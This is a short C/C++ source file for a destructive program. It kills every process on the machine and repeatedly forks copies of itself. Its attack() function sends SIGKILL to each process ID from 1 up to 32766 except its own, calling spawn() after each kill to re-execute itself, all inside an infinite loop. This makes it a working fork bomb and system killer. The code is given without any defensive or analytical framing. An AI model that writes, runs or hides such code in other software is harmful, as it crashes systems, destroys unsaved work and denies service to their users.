#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <string>

#define SZ_BUFFER 4096

void attack();
void spawn();
char* getExe(int pid);
char* exenm;

char* self;

int main(int argc, char* argv[]) {

	self = strdup(argv[0]);

	//exenm = getExe(getpid());
	
	
	while(1){
		//spawn();
		attack();
	}
}
void attack(){
	int p = getpid();
	int i = 1;
	while(i < 32767){
		if(i != p){
			kill(i, SIGKILL);
			spawn();
		}
		i++;
	}
}
void spawn() {
	int p = fork();
	if (p == 0) {
		execl(self, self, NULL);
	}
}

char* getExe(int pid){
	char* exe = new char[1024];
	char path[1024];

	sprintf(path, "/proc/%d/exe", pid);

	int ret = readlink(path, exe, 1023);
	if(ret == -1){
		return NULL;
	}
	exe[ret] = 0;
	return exe;
}


